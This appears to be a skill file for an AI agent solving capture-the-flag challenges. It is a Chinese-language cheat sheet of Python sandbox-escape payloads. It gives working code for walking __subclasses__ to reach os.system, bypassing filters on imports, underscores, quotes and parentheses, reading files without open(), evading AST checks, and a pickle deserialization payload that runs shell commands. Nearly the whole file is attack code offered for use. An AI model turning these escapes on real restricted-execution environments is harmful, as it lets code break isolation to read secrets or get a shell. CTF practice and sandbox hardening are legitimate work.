---
name: python-sandbox-escape
description: Python 沙箱逃逸(Pyjail)完整 payload 速查。Use when the challenge is about "Python 隔离/沙箱/受限执行/工作流跑 Python/eval/exec bypass" — targets where Python code execution is restricted and you need to escape to read /flag or get a shell.
---

# Python 沙箱逃逸(Pyjail)通法

## 第一步: 探测限制

```python
# 逐一试,看什么被禁:
1+1                    # 算术
'a'                    # 字符串
import os              # import
__import__('os')       # __import__
open('/flag')          # open
__builtins__           # builtins 是否存在
().__class__           # 属性访问
getattr(1,'__class__') # getattr
```

## 核心逃逸: __subclasses__ 走类继承链

```python
# 通杀payload: 从任意对象走到 os.system
().__class__.__bases__[0].__subclasses__()
# 找 os._wrap_close 的 index(每个环境不同,通常 100-200):
[i for i,c in enumerate(''.__class__.__mro__[1].__subclasses__()) if 'wrap_close' in str(c)]
# 拿到 index 后:
''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['system']('cat /flag')

# 或找 warnings.catch_warnings 恢复 __import__:
[i for i,c in enumerate(''.__class__.__mro__[1].__subclasses__()) if 'catch_warnings' in str(c)]
''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('os').system('cat /flag')
```

## 关键字被过滤时的绕过

| 被禁 | 绕过 |
|---|---|
| `import` | `__import__('os')` / `__builtins__.__dict__['__imp'+'ort__']` |
| `os` / `system` | 字符串拼接: `'o'+'s'` / chr 构造: `chr(111)+chr(115)` |
| `_`(下划线) | `getattr` + hex: `'\x5f\x5f'` |
| `.`(点号) | `getattr(obj, 'attr')` |
| `'`/`"`(引号) | `chr()` 构造 / `bytes([]).decode()` |
| `()`(括号) | 装饰器: `@exec` + `@input` + `class X: pass` |
| `[]`(方括号) | `__getitem__` |
| `eval`/`exec` | `__class_getitem__ = staticmethod(exec); X['payload']` |

## 无 open() 读文件

```python
# pathlib
__import__('pathlib').Path('/flag').read_text()
# os.read
import os; os.read(os.open('/flag',os.O_RDONLY),999)
# codecs
__import__('codecs').open('/flag').read()
# linecache
__import__('linecache').getlines('/flag')
# urllib (file 协议)
__import__('urllib.request').request.urlopen('file:///flag').read()
```

## AST 限制绕过

| 被禁 AST 节点 | 绕过 |
|---|---|
| `ast.Import` | 用 `__import__()` 函数调用 |
| `ast.Call`(禁止函数调用) | 装饰器 / `__init_subclass__` / `__class_getitem__` |
| `ast.Attribute`(禁止点访问) | `getattr()` |
| 所有表达式 | f-string: `f"{__import__('os').system('sh')}"` |

```python
# 禁止 Call 时用 __init_subclass__:
class Base:
    def __init_subclass__(cls, cmd='', **kwargs):
        __import__('os').system(cmd)
class Evil(Base, cmd='cat /flag'):
    pass

# 禁止 Call 时用 __class_getitem__:
class X:
    __class_getitem__ = staticmethod(exec)
X["__import__('os').system('cat /flag')"]
```

## 通杀 one-liner(从简到复杂逐一试)

```python
# Level 0: 无限制
__import__('os').system('cat /flag')

# Level 1: import 被禁
().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['system']('cat /flag')

# Level 2: _ 被禁
getattr(getattr(getattr((), chr(95)*2+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)*2), chr(95)*2+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)*2)[0], chr(95)*2+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)*2)()

# Level 3: 无引号无括号(装饰器)
@exec
@input
class X:
    pass
# (交互式输入 payload)

# Level 4: Pickle 反序列化
b"cos\nsystem\n(S'cat /flag'\ntR."
```

## 铁律

- **先探测限制(什么能用什么不能用),再选对应绕过**
- **subclasses index 每个环境不同** — 必须先列出再定位
- 不要死记 index,用列表推导找: `[i for i,c in enumerate(...) if 'keyword' in str(c)]`
- 读 /flag 优先试 `open()`→`os.read()`→`pathlib`→`linecache`,总有一个没被禁
